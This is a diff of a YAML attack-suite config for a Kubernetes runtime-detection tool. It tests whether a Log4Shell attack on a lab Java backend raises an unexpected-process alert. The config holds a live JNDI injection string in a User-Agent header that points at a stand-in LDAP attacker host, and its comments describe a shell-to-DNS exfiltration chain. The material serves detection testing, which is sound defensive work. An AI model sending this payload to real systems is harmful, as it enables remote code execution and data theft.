@@ -1,36 +1,31 @@
 apiVersion: bobctl.k8sstormcenter.io/v1alpha1
 kind: AttackSuite
 metadata:
-  name: log4j-chain-three-scenarios
-  description: |
-    ONE payload, THREE scenarios — the active-diagnosis framework's
-    discriminator test (Log4Shell / CVE-2021-44228).
+  name: log4j-chain-attacks
+  description: >-
+    Log4Shell (CVE-2021-44228) attack suite for bobctl autotune. Delivery is
+    HTTP into the chain-frontend (nginx) which proxies to chain-backend (Java +
+    log4j 2.14.1); the malicious JNDI string rides the User-Agent header and is
+    interpolated by log4j's message lookup → outbound LDAP to attacker-ns →
+    Payload class load → /bin/sh exec chain (psql → base32 → getent DNS exfil)
+    INSIDE the chain-backend container.
 
-    Same User-Agent string in every scenario:
-      ${jndi:ldap://attacker.attacker-ns.svc.cluster.local:1389/Payload}
+    The tuned profile is replicaset-chain-backend; its container is named
+    `backend` (the Deployment is chain-backend — the alert container_name label
+    is `backend`, which is what expectedDetections must match).
+    The benign baseline is the Java app serving /api/* over JDBC — it never
+    shells out — so the attack's sh/psql/getent spawn is an unexpected process
+    in that profile and fires R0001.
 
-    Same topology (chain-frontend → chain-backend → chain-postgres + a
-    cross-namespace LDAP server in attacker-ns).
-
-    What differs is the chain-backend container:
-      A = eclipse-temurin:11-jdk + log4j 2.14.1 + /bin/sh present
-      B = distroless/java11-debian11 + log4j 2.14.1 + hardened SC (RO-fs, non-root)
-      C = eclipse-temurin:11-jdk + log4j 2.17.1 (patch)
-
-    Detection narrative (with kubescape ApplicationProfile baseline learned
-    from log4j-chain-benign-baseline):
-      A: R0011 (egress to attacker:1389), R0001 (new comm /bin/sh under
-         java), R0010 (sensitive-file read /etc/shadow), R0011 again on
-         the DNS exfil egress.
-      B: R0011 (egress to attacker:1389), R1100 (failed execve ENOENT
-         — distroless has no /bin/sh, the smoking-gun "contained at exec").
-      C: nothing — log4j 2.17.1 doesn't perform JNDI substitution. The
-         JNDI literal lands in the HTTP headers and stays inert. This is
-         the negative-control scenario (clean verdict despite identical
-         payload).
-
-    Re-deploy chain-backend between scenarios (see RUNBOOK-FOR-AGENTS.md
-    step 5). The AttackSuite itself is identical across all three.
+    Detection narrative (scenario A = vulnerable, eclipse-temurin + log4j 2.14.1
+    + /bin/sh present):
+      R0001 — unexpected process launched (sh/psql/getent under java) ON chain-backend.
+    Config/scenario-dependent (NOT asserted — see comments on s2):
+      R0011 — egress to attacker:1389 / DNS exfil. Requires node-agent
+              networkEventsStreaming enabled; off by default on this cluster.
+      R0010 — sensitive-file read. Only the /etc/shadow Payload variant trips it;
+              the shipped Payload reads the postgres row, not /etc/shadow.
+      R1100 — failed-execve ENOENT, scenario B (distroless) only.
 
 target:
   service: chain-frontend
@@ -39,6 +34,7 @@ target:
   protocol: http
 
 attacks:
+  # ── Phase 1: RECON — benign auth probe (exercises the JWT path) ──────────────
   - name: s1-recon-benign-login
     type: probe
     http:
@@ -46,33 +42,33 @@ attacks:
       path: /api/login
       headers:
         Content-Type: application/json
-      body: '{"user":"alice","pass":"<stolen>"}'
+      body: '{"user":"alice@example.com","pass":"<stolen>"}'
     successIndicators:
       - statusCode: 200
-    expectedDetections: []   # benign — exercises the JWT issue path
+    expectedDetections: []   # benign — no detection expected
 
+  # ── Phase 2: EXPLOIT — Log4Shell JNDI in User-Agent ─────────────────────────
+  # The vulnerable line is chain-backend App.java:
+  #   log.info("product query q={} ua={}", q, ua)
+  # log4j 2.14.1 interpolates ${jndi:ldap://…} → LDAP fetch → Payload.class →
+  # Runtime.exec("/bin/sh", …) → psql/getent. None of those processes are in the
+  # Java app's learned baseline, so R0001 fires on chain-backend.
   - name: s2-jndi-in-user-agent
     type: jndi-injection
     http:
       method: GET
-      path: /api/products?q=test
+      path: /api/products
+      queryParams:
+        q: test
       headers:
         User-Agent: '${jndi:ldap://attacker.attacker-ns.svc.cluster.local:1389/Payload}'
     successIndicators:
       - statusCode: 200
     expectedDetections:
-      # On scenario A
-      - rule: R0011
-        target: chain-backend
-        condition: outbound to attacker.attacker-ns.svc.cluster.local:1389
-      - rule: R0001
-        target: chain-backend
-        condition: new comm /bin/sh under java parent
-      - rule: R0010
-        target: chain-backend
-        condition: sensitive file access (/etc/shadow or /var/run/secrets/*)
-      # On scenario B (replaces R0001 / R0010 above)
-      - rule: R1100
-        target: chain-backend
-        condition: failed execve ENOENT under java parent
-      # On scenario C — none expected
+      # Unpinned command (no `command:`): the JNDI exec chain spawns sh → psql →
+      # base32 → tr → getent and which kernel comm trips R0001 first is not
+      # stable across runs (skill rules #8/#10 — don't pin comm for multi-process
+      # exec chains). Match on rule + container only.
+      - ruleID: R0001
+        ruleName: Unexpected process launched
+        containerName: backend
